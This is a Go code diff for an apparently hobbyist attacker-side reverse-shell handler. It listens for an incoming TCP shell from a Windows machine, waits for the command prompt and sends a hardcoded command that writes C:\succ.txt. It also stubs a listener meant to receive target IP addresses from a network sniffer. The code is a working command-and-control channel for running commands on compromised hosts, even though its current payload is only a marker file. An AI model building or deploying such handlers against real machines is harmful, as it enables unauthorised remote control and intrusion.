@@ -4,7 +4,7 @@ import (
   "fmt"
   "net"
   "bufio"
-  //"time"
+  "time"
 )
 
 func ListenForConnection() net.Conn {
@@ -22,37 +22,54 @@ func CloseConnectionLoudly(conn net.Conn) {
   fmt.Println("Connection closed")
 }
 
-func ListenAndHandleTCPShell(stdreader *bufio.Reader){
-  fmt.Println("hello from the other thread")
+func ListenAndHandleTCPShell(){
+  command := "echo succ > C:\\succ.txt"
+  fmt.Println("Listening for reverse TCP shell...")
+
   conn := ListenForConnection()
-  scanner := bufio.NewScanner(conn)
+  reader := bufio.NewReader(conn)
   writer := bufio.NewWriter(conn)
-  defer fmt.Println("handle thead died")
-  go func() {
-    defer fmt.Println("reader thread died")
-    for scanner.Scan() {
-      fmt.Println("scanned data")
-      tcpdata := scanner.Text()
-      fmt.Println(tcpdata)
-    }
-  }()
-  for{
-    fmt.Println("Reading text: ")
-    text, _ := stdreader.ReadString('\n')
-    fmt.Println("read text: " + text)
-    if text == "yeet" {
-      fmt.Println("quitting")
-      break
-    }
-    fmt.Println("writing text")
-    _, err := writer.WriteString(text)
-    writer.WriteString("\r\n")
-    if err != nil {
-      fmt.Println("write error: " + err.Error())
-    }
-    fmt.Println("Flushing")
-    writer.Flush()
-    fmt.Println("wrote text")
+
+
+  _, readerr := reader.ReadString('>')
+  if readerr != nil {
+    fmt.Println("Error reading from reverse shell: " + readerr.Error())
   }
+  fmt.Println("Shell acquired, launching command...")
+  _, writeerr := writer.WriteString(command)
+  if writeerr != nil {
+    fmt.Println("Error writing to reverse shell: " + writeerr.Error())
+  }
+  writer.WriteString("\r\n")
+  writer.Flush()
+
+  _, readerr = reader.ReadString('>')
+  if readerr != nil {
+    fmt.Println("Error reading from reverse shell: " + readerr.Error())
+  }
+  fmt.Println("Command successfully launched")
+
   CloseConnectionLoudly(conn)
+}
+
+func ListenForSnifferData(ip_passing_channel chan string){
+  /*
+  listener, _ := net.Listen("tcp", ":6565")
+  for {
+    conn, err := listener.Accept()
+    if err != nil {
+      fmt.Println("We gotta error connecting to the sniffer: " + err.Error())
+    }
+    ipreader := bufio.NewReader(conn)
+    ip, readerr := bufio.ReadString('\x00')
+    if readerr != nil {
+      fmt.Println("We gotta error reading from the sniffer: " + readerr)
+    }
+    fmt.Println("Read IP: " + ip)
+    */
+    time.Sleep(1000 * time.Millisecond)
+    ip := "192.168.1.53"
+    fmt.Println("Listener is passing IP")
+    ip_passing_channel <- ip
+  //}
 }
